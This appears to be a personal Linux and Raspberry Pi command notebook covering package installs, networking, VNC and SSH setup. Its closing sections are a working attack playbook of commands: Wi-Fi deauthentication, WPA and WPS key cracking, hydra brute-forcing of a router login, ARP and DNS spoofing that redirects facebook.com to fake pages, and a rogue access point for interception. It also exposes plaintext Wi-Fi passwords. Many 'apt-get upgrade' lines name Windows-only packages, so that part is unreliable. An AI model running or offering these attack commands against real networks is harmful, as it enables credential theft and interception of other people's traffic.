absl-py opencv-python opt-einsum keras-preprocessing pandas-profiling google-pasta threadpoolctl

sudo apt-get upgrade octave -y
sudo apt-get upgrade scilab -y

sudo apt-get upgrade golang -y
sudo apt-get upgrade kotlinc -y
sudo apt-get upgrade julia -y

sudo apt-get upgrade notepadplusplus.install -y
sudo apt-get upgrade sublimetext3 -y
sudo apt-get upgrade codeblocks -y
sudo apt-get upgrade atom.install -y
sudo apt-get upgrade atom -y

apm install platformio-ide
apm install platformio-ide-debugger
apm install platformio-ide-terminal

apm install atom-beautify
apm install minimap
apm install file-icons
apm install highlight-selected
apm install pigments
apm install autoclose-html
apm install tabs-to-spaces
apm install atom-live-server

sudo apt-get upgrade vim -y
sudo apt-get upgrade mkdocs -y
sudo apt-get upgrade xml-notepad -y

sudo apt-get upgrade sqlite -y
sudo apt-get upgrade mongodb -y
sudo apt-get upgrade mariadb -y
sudo apt-get upgrade postgresql -y

sudo apt-get upgrade vscode.install -y
sudo apt-get upgrade vscode -y

code --install-extension ms-ceintl.vscode-language-pack-en-gb
code --install-extension ms-vscode-remote.remote-ssh
code --install-extension ms-vscode-remote.remote-ssh-edit
code --install-extension ms-vscode-remote.remote-wsl
code --install-extension ms-vscode-remote.vscode-remote-extensionpack
code --install-extension ms-vscode-remote.remote-containers

code --install-extension ms-vscode.powershell
code --install-extension github.vscode-pull-request-github
code --install-extension ms-vscode.wordcount
        
code --install-extension ms-python.python
code --install-extension ms-python.vscode-pylance
code --install-extension ms-dotnettools.vscode-dotnet-runtime

code --install-extension golang.go

code --install-extension vscode-icons-team.vscode-icons
code --install-extension vsciot-vscode.vscode-arduino

code --install-extension mindaro-dev.file-downloader
code --install-extension mindaro.mindaro

code --install-extension platformio.platformio-ide

code --install-extension samcogan.arm-snippets
code --install-extension twxs.cmake
code --install-extension wholroyd.jinja

code --install-extension alefragnani.delphi-keybindings
code --install-extension alefragnani.delphi-pack
code --install-extension alefragnani.delphi-themes
code --install-extension alefragnani.numbered-bookmarks
code --install-extension alefragnani.pascal
code --install-extension alefragnani.pascal-formatter

code --list-extensions | xargs -l 1 echo code --install-extension
  
sudo apt-get upgrade androidstudio -y
sudo apt-get upgrade pencil -y

sudo apt-get upgrade hackfont-windows -y
sudo apt-get upgrade nmap -y
sudo apt-get upgrade wireshark -y
sudo apt-get upgrade gnuradio -y
sudo apt-get upgrade sdrsharp -y
sudo apt-get upgrade chirp.install -y
sudo apt-get upgrade chirp -y
sudo apt-get upgrade spybot -y
sudo apt-get upgrade fiddler -y
sudo apt-get upgrade soapui -y
sudo apt-get upgrade chromedriver -y

sudo apt-get upgrade ghostscript.app -y
sudo apt-get upgrade scribus -y
sudo apt-get upgrade inkscape -y
sudo apt-get upgrade drawio -y
sudo apt-get upgrade vscode-drawio -y
sudo apt-get upgrade yed -y
sudo apt-get upgrade dia -y
sudo apt-get upgrade irfanview -y
sudo apt-get upgrade krita -y
sudo apt-get upgrade gimp -y
sudo apt-get upgrade gimp-data-extras -y
sudo apt-get upgrade photogimp -y
sudo apt-get upgrade darktable -y
sudo apt-get upgrade lazpaint -y
sudo apt-get upgrade blender -y
sudo apt-get upgrade natron.install -y
sudo apt-get upgrade natron -y
sudo apt-get upgrade pov-ray -y
sudo apt-get upgrade sweet-home-3d -y
sudo apt-get upgrade librecad -y
sudo apt-get upgrade freecad -y

sudo apt-get upgrade studio -y
sudo apt-get upgrade stellrium -y

sudo apt-get upgrade lame -y
sudo apt-get upgrade audacity -y
sudo apt-get upgrade audacity-lame -y
sudo apt-get upgrade mixxx -y
sudo apt-get upgrade lmms -y
sudo apt-get upgrade musescore -y
sudo apt-get upgrade winamp -y
sudo apt-get upgrade audacious -y

sudo apt-get upgrade ffmpeg -y
sudo apt-get upgrade virtualdub -y
sudo apt-get upgrade kdenlive -y
sudo apt-get upgrade openshot -y
sudo apt-get upgrade shotcut.install -y
sudo apt-get upgrade shotcut -y
sudo apt-get upgrade mpv.install -y
sudo apt-get upgrade mpv -y
sudo apt-get upgrade vlc -y
sudo apt-get upgrade handbrake.install -y
sudo apt-get upgrade handbrake -y
sudo apt-get upgrade lightworks -y

sudo apt-get upgrade youtube-dl -y

sudo apt-get upgrade jellyfin -y
sudo apt-get upgrade kodi -y
sudo apt-get upgrade plexmediaserver -y
sudo apt-get upgrade plex -y
sudo apt-get upgrade plexamp -y

sudo apt-get upgrade libreoffice-still -y
sudo apt-get upgrade calibre -y
sudo apt-get upgrade onlyoffice -y
sudo apt-get upgrade gnumeric -y
sudo apt-get upgrade gnucash -y
sudo apt-get upgrade ganttproject -y
sudo apt-get upgrade joplin -y
sudo apt-get upgrade simplenote -y
sudo apt-get upgrade adobereader -y
sudo apt-get upgrade okular -y

sudo apt-get upgrade silverlight -y
sudo apt-get upgrade flashplayerppapi -y
sudo apt-get upgrade flashplayerplugin -y
sudo apt-get upgrade flashplayeractivex -y
sudo apt-get upgrade adobeair -y
sudo apt-get upgrade adobeshockwaveplayer -y

sudo apt-get upgrade windirstat -y
sudo apt-get upgrade wiztree -y
sudo apt-get upgrade treesizefree -y
sudo apt-get upgrade conemu -y
sudo apt-get upgrade microsoft-windows-terminal -y
            
sudo apt-get upgrade sqlserver-cmdlineutils -y
sudo apt-get upgrade sql-server-management-studio --force -y
sudo apt-get upgrade azure-data-studio -y
sudo apt-get upgrade chocolatey-azuredatastudio.extension -y
sudo apt-get upgrade azuredatastudio-powershell -y
sudo apt-get upgrade azure-data-studio-sql-server-admin-pack -y
sudo apt-get upgrade powerbi -y
sudo apt-get upgrade powerbi-reportbuilder -y
sudo apt-get upgrade daxstudio -y

sudo apt-get upgrade steam -y
sudo apt-get upgrade goggalaxy -y
sudo apt-get upgrade epicgameslauncher -y
sudo apt-get upgrade ubisoft-connect -y
sudo apt-get upgrade origin -y

sudo apt-get upgrade obs-studio -y
sudo apt-get upgrade manycam -y
sudo apt-get upgrade logitechgaming -y

sudo apt-get upgrade godot -y
sudo apt-get upgrade unreal-linux-toolchain -y
sudo apt-get upgrade unity-hub -y
sudo apt-get upgrade unity -y
sudo apt-get upgrade cheatengine -y
sudo apt-get upgrade joytokey -y
sudo apt-get upgrade reshade -y

sudo apt-get upgrade astromenace -y
sudo apt-get upgrade flightgear -y
sudo apt-get upgrade openra -y
sudo apt-get upgrade openttd -y
sudo apt-get upgrade openxcom -y
sudo apt-get upgrade freeciv -y
sudo apt-get upgrade brutaldoom -y
sudo apt-get upgrade eduke32 -y
sudo apt-get upgrade zdoom -y

sudo apt-get upgrade hedgewars -y
sudo apt-get upgrade supertuxkart -y
sudo apt-get upgrade tuxguitar -y
sudo apt-get upgrade tux-typing -y
sudo apt-get upgrade tux-of-math-command -y
sudo apt-get upgrade tux-paint -y
sudo apt-get upgrade tux-paint-stamps -y

sudo apt-get upgrade scummvm -y
sudo apt-get upgrade dosbox -y
sudo apt-get upgrade mame -y
sudo apt-get upgrade retroarch -y
sudo apt-get upgrade emulationstation.install -y
sudo apt-get upgrade emulationstation -y
sudo apt-get upgrade dolphin -y
sudo apt-get upgrade project64 -y
sudo apt-get upgrade snes9x -y
sudo apt-get upgrade ppsspp -y
sudo apt-get upgrade pcsx2.portable -y
sudo apt-get upgrade cemu -y
sudo apt-get upgrade fs-uae -y

sudo apt-get upgrade zap -y
sudo apt-get upgrade pvs-studio -y
sudo apt-get upgrade burp-suite-free-edition -y


#Install the collection of software required
sudo apt-get install libjs-sphinxdoc libjs-underscore libraspberrypi-bin libraspberrypi-dev libraspberrypi0 pi-bluetooth python-picamera python-sense-emu python3-picamera python3-sense-emu python-picamera-docs python-sense-emu-doc realvnc-vnc-viewer realvnc-vnc-server rpi-chromium-mods sense-hat

sudo apt-get install awscli gcloud


sudo apt-get install eclipse feedgnuplot golang gnuplot gnuplot-doc python-setuptools python3 python3-dev python3-nose python3-numpy python3-pip python3-scipy python-dev python-gnuplot python-matplotlib python-pip python-scipy python-sphinx python-sympy cmake cython3 build-essential cgroup-bin lazarus octave octave-info octave-doc octave-htmldoc pyflakes pylint git git-doc gfortran gfortran-4.9-doc libgfortran3-dbg libgnuplot-iostream-dev r-base-core r-recommended r-doc-info r-doc-pdf r-mathlib r-base-html
# download 1600MB space 3809MB

sudo apt-get install audacity blender calibre dia dvdauthor ghostscript ghostscript-x gimp gimp-help-en gimp-data-extras gnuradio inkscape libwidevinecdm0 libfreeimage-dev libfreetype6-dev librecad mesa-utils mixxx scribus scribus-doc scribus-template stellarium sweethome3d timidity timidity-daemon vlc vokoscreen imagemagick imagemagick-doc povray povray-includes povray-examples radiance radiance-doc radiance-materials tcsh kodi jack ardour qtractor hydrogen yoshimi rakarrack gladish puredata csound chuck shotwell subversion csound-utils laditools hydrogen-drumkits rubberband-cli a2jmidid stk javascript-common gem arc-theme papirus-icon-theme breeze-cursor-theme
# download 771MB space 1819MB

sudo apt-get install aircrack-ng apache2 apache2-doc avahi-daemon bridge-utils claws-mail dialog dnsmasq eject exfat-fuse ethtool filezilla nautilus gnucash gnumeric gnumeric-plugins-extra guile-2.0-doc help2man hostapd hydra iperf keepass2 keepass2-doc libboost-date-time-dev libboost-filesystem-dev libboost-locale-dev libboost-system-dev libcurl4-openssl-dev libdbus-1-dev libeigen3-dev libudev-dev macchanger matchbox-keyboard metacity nmap ntfs-3g openssh-server putty putty-doc pyrit qemu rsync tcpdump tcpreplay telnet tinyca unicode wbar wbar-config wireshark wireshark-doc xrdp xtightvncviewer zenmap pidgin-otr finger
#xdm xfce4 xfce4-terminal xfonts-base
# download 266MB space 859MB

sudo apt-get install beneath-a-steel-sky drascula drascula-music flight-of-the-amazon-queen lure-of-the-temptress scummvm scummvm-data libmpeg2-4
# download 186MB space 267MB

sudo apt-get install dosbox libasound2 libasound2-dev pokerth supertux supertuxkart torcs tuxguitar tuxguitar-alsa tuxguitar-jsa tuxguitar-oss tuxmath tuxpaint chuck desmume flightgear freeciv-client-extras freeciv-client-gtk freeciv-server freeciv-sound-standard freeciv-client-gtk libegl1-mesa libgl1-mesa-dev neverball openttd openttd-opengfx openttd-openmsx openttd-opensfx pmidi fluid-soundfont-gm fluid-soundfont-gs jack-tools jackd libsdl2-dev osspd libasound2 libasound2-dev joy2key higan yabause stella sudoku xine-ui 
# download 1904MB space 3352MB

sudo apt-get install apt-transport-https fdm freepats gitk gksu groff leafpad libapache2-mod-php5 libglew-dev libhtml-template-perl libipc-sharedcache-perl liblapack-dev liblinear-dev liblinear-tools libsvm-tools libvirt-bin lilypond lilypond-doc-pdf mcrypt meterbridge mysql-server nodejs npm openmpi-bin openshot php-pear php5 php5-cli php5-mcrypt php5-mysql php5-readline phpmyadmin qjackctl reaver scons skipfish ssh vagrant 


#Cleanup any software that is no longer required after updating
sudo apt-get autoremove

#List the connected USB devices
lsusb

#List the bulk storage devices
blkid

#Find and list any externally connected drives
sudo fdisk -l
#Make the mount directory and manage it's owner
sudo mkdir /media/pidrive
sudo chown pi:pi /media/pidrive
#Mount the drive as NTFS accessible
sudo mount -t ntfs-3g -o uid-pi,gid-pi /dev/sda /media/pidrive
#Now you're done but it's not permanent
 
#Making it permanent
#Edit file system table
sudo nano /etc/fstab
 
#Add this line of text after the SD card partitions
/dev/sda1   /media/pidrive  ntfs-3g uid=pi,gid=pi   0   0
#Press Ctrl-o to save and Ctrl-x to exit nano
 

#Clone the MiniNet GitHub repository
git clone git://github.com/mininet/mininet

#List interface configuration
ifconfig

#List network status
netstat -r

#To use an Android device as a KVM(Keyboard Video Mouse) for the Raspberry Pi
#Edit the network interfaces to assign a static IP address to a USB port
sudo nano /etc/network/interfaces

#Paste the following into the file, then save and exit (ctrl-X, Y):
auto lo
iface lo inet loopback

#auto eth0
#iface eth0 inet static
#address 192.168.144.42
#netmask 255.255.255.0
#network 192.168.144.0
#broadcast 192.168.144.255
#gateway 192.168.144.1

allow-hotplug wlan0
auto wlan0
iface wlan0 inet dhcp
wireless-power off
post-up iwconfig wlan0 power off
#    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
wpa_ssid "WWWireless"
wpa_psk "w1r3l3s5"
auto wlan0
 
allow-hotplug wlan1
auto wlan1
iface wlan1 inet dhcp
post-up iwconfig wlan1 power off
#    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
wpa_ssid "virginmedia3410484"
wpa_psk "glwlpxna"

#allow-hotplug usb0
#iface usb0 inet static
#address 192.168.42.42
#netmask 255.255.255.0
#network 192.168.42.0
#broadcast 192.168.42.255
#gateway 192.168.42.129



wpa_passpharse ssid passpharse

#Edit  the WPA Wi-Fi file to assign SSID's to specific interfaces
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf

ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
country=GB

network={
        ssid="WWWireless"
        psk="dzFyM2wzczU="
        key_mgmt=WPA-PSK
}

network={
        ssid="virginmedia3410484"
        psk="Z2x3bHB4bmE="
        key_mgmt=WPA-PSK
}



#Add a default gateway static route to use the network access of the Android device via USB tethering 
sudo route add default gw 192.168.42.129 usb0

#Remove any dynamic leases
sudo rm /var/lib/dhcp/*
sudo ip addr flush dev eth0
#Restart networking to apply the changes
sudo /etc/init.d/networking restart
sudo systemctl daemon-reload

#Allow root to login remotely via SSH
sudo nano /etc/ssh/sshd_config
#Change PermitRootLogin without-password
#to PermitRootLogin yes
#Press Ctrl-o to save and Ctrl-x to exit nano
sudo service ssh restart

#To enable permanant headless operation by using an Android device as a KVM
cd /etc/init.d
#Create a new file called vncboot. You’ll need root privileges to change anything in this directory.
sudo nano /etc/init.d/vncboot

#Paste the following into the file (change export USER=’pi’ to your username if not pi, and edit the screen resolution in the start) block if necessary):

#-------------------------
#! /bin/sh
### BEGIN INIT INFO
# Provides:          vncboot
# Required-Start:    $local_fs
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Run tightvnc on boot
### END INIT INFO

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin
export USER='pi'

eval cd ~$USER

. /lib/init/vars.sh
. /lib/lsb/init-functions

case "$1" in
  start)
    log_begin_msg "Starting VNC server"
    su $USER -c '/usr/bin/vncserver :1 -geometry 1280x720 -depth 24 -dpi 72'
    log_end_msg $?
    exit 0
    ;;
  stop)
    pkill Xtightvnc
    log_begin_msg "Stopping VNC server"
    log_end_msg $?
    exit 0
    ;;
  *)
    echo "Usage: /etc/init.d/vncboot {start|stop}"
    exit 1
    ;;
esac

#------------------
#Press Ctrl-o to save and Ctrl-x to exit nano
 
#Update the permissions of the file to make it executable
sudo chmod 755 /etc/init.d/vncboot

#Finally, run the following command to add it to your startup:
sudo update-rc.d vncboot defaults

#Changing the VNC server password
/usr/bin/tightvncpasswd

#Manully starting VNC server
tightvncserver

#Manually starting a VNC session from a shell script
nano vnc.sh
#!/bin/sh
vncserver :0 -geometry 1280x720 -depth 24 -dpi 72
#Press Ctrl-o to save and Ctrl-x to exit nano
chmod +x vnc.sh

#Export Xwindows to use applications via an Xwindows server 
export DISPLAY=192.168.42.129:0
export PULSE_SERVER=tcp:192.168.42.129:4712
metacity & gimp

#Enable USB tethering on Android device and connect using SSH or VNC
VNC to 192.168.42.42:1
SSH to 192.168.42.42

#Restart
sudo shutdown -r now



#--------------------------------------------------------------------------------------------------------------------------------
#Updating Debian based Linux distributions

cat /etc/*-release
source /etc/os-release
echo $UBUNTU_CODENAME
uname -a

sudo bash -c "echo 'vm.swappiness = 20' >> /etc/sysctl.conf"

sudo nano /etc/apt/sources.list

## SOURCES LIST FOR UBUNTU 16.04.x LTS XENIAL XERUS
## ALSO FOR XUBUNTU 16.04.x, LUBUNTU 16.04.x
## AND KUBUNTU 16.04.x
## From: http://sites.google.com/site/easylinuxtipsproject
## This list is for the Main server; you might want to select a
## faster mirror server closer to you, with Software & Updates.
## Only fit for 16.04.x LTS Xenial Xerus!
#
## SOURCES FOR ORDINARY UPDATES AND SOFTWARE:
deb http://archive.ubuntu.com/ubuntu xenial main
deb http://archive.ubuntu.com/ubuntu xenial-updates main
deb http://archive.ubuntu.com/ubuntu xenial restricted
deb http://archive.ubuntu.com/ubuntu xenial-updates restricted
deb http://archive.ubuntu.com/ubuntu xenial universe
deb http://archive.ubuntu.com/ubuntu xenial-updates universe
deb http://archive.ubuntu.com/ubuntu xenial multiverse
deb http://archive.ubuntu.com/ubuntu xenial-updates multiverse
#
## SOURCES FOR SECURITY UPDATES:
deb http://archive.ubuntu.com/ubuntu xenial-security main
deb http://archive.ubuntu.com/ubuntu xenial-security restricted
deb http://archive.ubuntu.com/ubuntu xenial-security universe
deb http://archive.ubuntu.com/ubuntu xenial-security multiverse
#
## BACKPORTS SOURCES (WITH LOWERED PRIORITY):
deb http://archive.ubuntu.com/ubuntu xenial-backports main
deb http://archive.ubuntu.com/ubuntu xenial-backports restricted
deb http://archive.ubuntu.com/ubuntu xenial-backports universe
deb http://archive.ubuntu.com/ubuntu xenial-backports multiverse
#
## PARTNER SOURCE (FOR SOFTWARE FROM
## PARTNERS OF CANONICAL):
deb http://archive.canonical.com/ubuntu xenial partner
#
## SOURCE FOR WEB BROWSER GOOGLE CHROME
## (DISABLED BY DEFAULT):
## Only enable it when you've installed Google Chrome!
## You can enable it in the application Software & Updates.
# deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list'
sudo apt-get update
sudo apt-get install google-chrome-stable


sudo add-apt-repository ppa:mixxx/mixxx
sudo add-apt-repository ppa:kubuntu-ppa/backports 
sudo add-apt-repository ppa:c.falco/mame
sudo add-apt-repository ppa:hunter-kaller/ppa
sudo add-apt-repository ppa:libretro/stable
sudo add-apt-repository ppa:webupd8team/y-ppa-manager

sudo apt-get autoremove -y && sudo apt-get clean && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y
sudo apt-get update && sudo apt-get autoremove -y && sudo apt-get clean && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y

# Install some useful packages

wget -qO - https://packages.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb http://packages.elastic.co/logstash/2.1/debian stable main" | sudo tee -a /etc/apt/sources.list
echo "deb http://packages.elastic.co/elasticsearch/2.x/debian stable main" | sudo tee -a /etc/apt/sources.list.d/elasticsearch-2.x.list

echo "deb http://download.virtualbox.org/virtualbox/debian `lsb_release -sc` contrib" | sudo tee -a /etc/apt/sources.list
echo "deb http://download.virtualbox.org/virtualbox/debian `grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }'` contrib" | sudo tee -a /etc/apt/sources.list

wget --output-document=/etc/apt/sources.list.d/medibuntu.list http://www.medibuntu.org/sources.list.d/$(lsb_release -cs).list
wget --output-document=/etc/apt/sources.list.d/medibuntu.list http://www.medibuntu.org/sources.list.d/$(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }').list



sudo apt-get install aircrack-ng apache2 apt-transport-https audacity beneath-a-steel-sky blender bridge-utils build-essential burp calibre chuck claws-mail cmake cpu-checker cython3 desmume dia dnsmasq dopewars dopewars-data dosbox drascula drascula-music dvdauthor ethtool fceux feedgnuplot filezilla firefox flight-of-the-amazon-queen flightgear fluid-soundfont-gm fluid-soundfont-gs freeciv-client-extras freeciv-client-gtk freeciv-server freeciv-sound-standard freepats frozen-bubble frozen-bubble-data gddrescue gfortran ghostscript gimp git gitk gksu gnome-disk-utility gnome-video-arcade gnucash gnugo gnumeric gnuplot-doc golang graphviz-doc groff guile-1.8-doc hedgewars hedgewars-data higan hostapd hydra inkscape ipython ipython-notebook ipython3 jack-tools jackd jackd2-firewire joy2key julia kdenlive khelpcenter keepass2 krita qemu-kvm lazarus leafpad libasound2 libasound2-dev libboost-date-time-dev libboost-filesystem-dev libboost-locale-dev libboost-system-dev libcurl4-openssl-dev libegl1-mesa libeigen3-dev libfreeimage-dev libfreetype6-dev libgl1-mesa-dev libglew-dev libgnuplot-iostream-dev libhtml-template-perl libipc-sharedcache-perl liblapack-dev liblinear-dev liblinear-tools librecad libsdl2-dev libsvm-tools libvirt-bin lilypond lilypond-doc lilypond-doc-html lilypond-doc-pdf lure-of-the-temptress lynx-cur macchanger mame mame-extra mame-tools mcrypt mednafen mess mess-data mess-desktop-entries meterbridge mininet mixxx mupen64plus mysql-server nexuiz nexuiz-data nexuiz-music nexuiz-server nexuiz-textures nmap nodejs npm ntfs-3g nvidia-cg-toolkit octave openhackware openmpi-bin openshot openshot-doc openssh-server openttd openttd-opengfx openttd-openmsx openttd-opensfx osspd pidgin-otr playonlinux pmidi pokerth pokerth-data pokerth-server pong2 prboom-plus prboom-plus-game-server pulseaudio-esound-compat putty pyrit python-dev python-gnuplot python-matplotlib python-pip python-scipy python-sphinx python-sympy python3 python3-dev python3-nose python3-numpy python3-pip python3-scipy python3-setuptools qemu qgo qjackctl quake quake-server quake2 quake2-server quake3 quake3-server quakespasm r-base-core r-recommended reaver rott rsync samba scons screen scribus scribus-doc scribus-template scummvm scummvm-data sqlmap skipfish ssh stella stellarium sudoku supertux supertux-data supertuxkart supertuxkart-data sudoku sweethome3d telnet tightvncserver timidity timidity-daemon tinyca tmux torcs torcs-data torcs-data-cars torcs-data-tracks tuxguitar tuxguitar-alsa tuxguitar-jsa tuxguitar-oss tuxpaint tumiki-fighters tumiki-fighters-data tuxfootball tuxmath tuxmath-data tuxpuck tuxtype tuxtype-data ubuntu-drivers-common uhexen2 uhexen2-common unicode vagrant vbaexpress virtinst virtualbox virtualbox-dkms virtualbox-guest-additions-iso virtualbox-guest-dkms virtualbox-guest-utils virtualbox-qt visualboyadvance visualboyadvance-gtk vlc vokoscreen vorbis-tools winetricks wireshark wolf4sdl x264 xtightvncviewer xqf yabause zenmap jack ardour qtractor hydrogen yoshimi rakarrack gladish puredata supercollider csound chuck mypaint darktable shotwell mypaint-data-extras account-plugin-facebook account-plugin-google account-plugin-flickr unity-control-center-signon subversion csound-utils laditools hydrogen-drumkits rubberband-cli a2jmidid stk javascript-common gem supercollider-supernova ubuntu-edu-preschool ubuntu-edu-primary ubuntu-edu-secondary ubuntu-edu-tertiary vde2 vde2-cryptcab

#fdm xdm xfce4 xfce4-terminal 

sudo apt-get autoremove
sudo update-rc.d elasticsearch defaults 95 10


#Install Python3 libraries
sudo apt-get install python3-dev python3-pip python3-setuptools
sudo pip3 install --upgrade pip setuptools
sudo pip3 install -U `pip3 list --outdated | awk '{ print $1}'`
sudo pip3 install --upgrade awscli bitcoin blockchain boto3 certifi datalab decorator ethereum gcloud gevent greenlet ipython ipython-genutils jinja2 joystick nose pickleshare pynput pygobject pyparsing pyreadline python-dateutil pytz pyzmq simplegeneric six tensorflow tornado traitlets

pillow pwntools


#Install Python2 libraries
sudo apt-get install python-dev python-pip python-setuptools
sudo pip install --upgrade pip setuptools
sudo pip install -U `pip list --outdated | awk '{ print $1}'`
sudo pip install --upgrade awscli bitcoin blockchain boto bx-python cheetah cython datalab ethereum freeze gcloud ipython jsonschema list matplotlib mininet notebook numpy pycrypto pysqlite pyzmq ryu scipy tornado pwntools

#--------------------------------------------------------------------------------------------------------------------------------
#Setting up and connecting to a Linux SSH server

#Install the SSH server
sudo apt-get install openssh-server


#Create the SSH authentication key pair

ssh-keygen -t rsa -C "me@here.local"

ssh-copy-id 

mkdir ~/.ssh

touch ~/.ssh/authorized_keys

chmod go-w ~/

chmod 700 ~/.ssh

chmod 600 ~/.ssh/authorized_keys

#Disable SSH password prompt

#edit
/etc/ssh/sshd_config
#change
PermitRootLogin yes
#to
PermitRootLogin without-password

reload ssh





#--------------------------------------------------------------------------------------------------------------------------------
#SSH PortForwarding

#Configure Simple SSH Port-Forwarding

#Run these commands on the server that will be performing the port forwarding.

#1. Enable IP Forwarding
sudo sysctl net.ipv4.ip_forward=1
#2. Forward traffic on port 1111 to IP 192.168.144.42 on port 22
sudo iptables -t nat -A PREROUTING -p tcp --dport 1111 -j DNAT --to-destination 192.168.144.42:22
dport = incoming port that will forward the traffic

#to-destination = server IP address and port that you are forwarding to

#3. Ask iptables to Masquerade
 sudo iptables -t nat -A POSTROUTING -j MASQUERADE
#4. Test
#From the client PC, SSH to the server that is doing the port forwarding.  If the server doing the port forwarding is 192.168.42.42, then ssh to 192.168.42.42:1111.  You should be connected to 192.168.144.42 via SSH (port 22).

#5. Save iptables rules
sudo sh -c "iptables-save > /etc/iptables.rules"
#6. Automatically apply iptables rules at startup
#a. Edit the interface the rules apply to by editing /etc/network/interfaces

#At the end of the network related lines for that interface, add the line:

#pre-up iptables-restore < /etc/iptables.rules
b. Edit /etc/sysctl.conf by adding the line net.ipv4.ip_forward = 1.

 

 

#If you want to keep information from byte and packet counters, use the command:
sudo sh -c "iptables-save -c > /etc/iptables.rules"

#List PREROUTING Rules
sudo iptables -t nat {--line-numbers} -L

#Delete NAT Rule
sudo iptables -t nat -D PREROUTING [line #]

#Note: The option "-t nat" are not needed when you want to delete POSTROUTING, INPUT, or OUTPUT rules.



#--------------------------------------------------------------------------------------------------------------------------------
# rsync

rsync -av . me@here.remote:~/fromthere



#--------------------------------------------------------------------------------------------------------------------------------
#Linux networking commands

ifconfig eth0

#Show all active and inactive interfaces
ifconfig -a

#Show only wireless interfaces
iwconfig

#Change interface state
ifconfig eth0 down
ifdown eth0
ifconfig eth0 up
ifup eth0

#Change interface settings
ifconfig eth0 192.168.0.24
ifconfig eth0 netmask 255.255.255.0
ifconfig etho broadcast 192.168.0.64
ifconfig eth0 hw ether 00:00:00:00:00:00
ifconfig eth0 172.16.25.125 netmask 255.255.255.224 broadcast 172.16.25.63
ifconfig eth0 mtu 1500
ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF

#Setting promiscuous mode
ifconfig eth0 promisc
ifconfig eth0 -promisc

#Add New Alias to Network Interface
ifconfig eth0:0 172.16.25.127
ifconfig eth0:0
ifconfig eth0:0 down



#--------------------------------------------------------------------------------------------------------------------------------
#Using the AirCrack suite to decrypt access point packet captures

#Installing the AirCrack suite

sudo apt-get install aircrack-ng



#Enabling monitor mode

sudo airmon-ng check kill
sudo airmon-ng start wlan1



#Disabling monitor model

sudo airmon-ng stop wlan1
sudo service network-manager start



#--------------------------------------------------------------------------------------------------------------------------------
#Changing the interface MAC address and capturing packets

sudo apt-get install macchanger
ifconfig wlan1 down
sudo macchanger -r wlan1
ifconfig wlan1 up

sudo airmon-ng check kill
sudo airmon-ng start wlan1

#Listen using the monitor interface

sudo airodump-ng wlan1mon

#Listen to a specific access point on a specific channel using the monitor interface

sudo airodump-ng --channel 44 --bssid 00:00:00:00:00:00 --write ./packet.cap wlan1mon

#Inject deauthentication packets to disconnect a client from an access point

sudo aireplay-ng --deauth 2000 -a 00:00:00:00:00:00 -c 00:00:00:00:00:01 wlan1mon

#Use AirCrack to attempt to find the access point key in the capture file from a password list

sudo aircrack-ng ./packet.cap -w ./passwords.list

#Decrypt a packet capture file using the recovered access point key

sudo airdecap-ng -e 'ACCESSPOINT' -p password ./packet.cap



#--------------------------------------------------------------------------------------------------------------------------------
#Using Pyrit to attempt to find the access point key in a capture file

sudo apt-get install pyrit
pyrit list_cores
sudo pyrit -r ./packet.cap analyze
sudo pyrit -i ./passwords.list import_passwords
sudo pyrit -e ACCESSPOINT create_essid
pyrit eval
pyrit batch
sudo pyrit -r ./packet.cap attack_db
sudo pyrit -e ACCESSPOINT delete_eesid
sudo rm -rf .pyrit/blobspace/password/



#--------------------------------------------------------------------------------------------------------------------------------
#Using Reaver to recover WPS access point key

sudo airodump-ng --wps wlan1mon
sudo reaver -i wlan1mon -b 00:00:00:00:00:00 -c 44 -f -a -w -vv -K 1



#--------------------------------------------------------------------------------------------------------------------------------
#Using Hydra to recover access point management credentials

sudo hydra http://[192.168.1.1]/login.html -e ns -F -V -t 4 -l username -p password
sudo hydra http://[192.168.1.1]/login.html -e ns -F -V -t 4 -L ./usernames.list -P ./passwords.list



#--------------------------------------------------------------------------------------------------------------------------------
#ARP and DNS spoofing

#Install routing tools, DNS masquaraidig and access point packages
sudo apt-get install bridge-utils dnsmasq hostapd

#Create a spoof DNS hosts file
./spoofhosts.dns
192.168.0.1		www*
192.168.0.1		facebook.com

#Create fake web pages
/var/www/html/fakepage.html

#Start the Apache web server
sudo apache2ctl start

#Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

#Enable firewall
iptables -P FORWARD ACCEPT

#Start ARP spoofing
sudo arpspoof -t 192.168.0.24 192.168.0.1 && sudo arpspoof -t 192.168.0.1 192.168.0.24

#Start DNS spoofing
sudo dnsspoof -f ./spoofhosts.dns host 192.168.0.24 and udp port 53



#--------------------------------------------------------------------------------------------------------------------------------
#Create a MITM fake access point

#Create a DNS masquaraiding configuration
/etc/dnsmasq.conf
interface=at0
dhcp-range=10.0.0.10,10.0.0.110,1h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp

#Create a spoof DNS hosts file
./spoofhosts.dns
192.168.0.1		www*
192.168.0.1		facebook.com

#Start fake access point
sudo airbase-ng -e 'FREEWIFI4ALL' -c 44 wlan1mon

#Start DNS madquaraiding
sudo dnsmasq -C /etc/dnsmasq.conf -H ./spoofhosts.dns -d

#Bring up the fake access point interface
ifconfig at0 10.0.0.1/24 up

#Enable routes
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

#Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

#Enable firewall
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

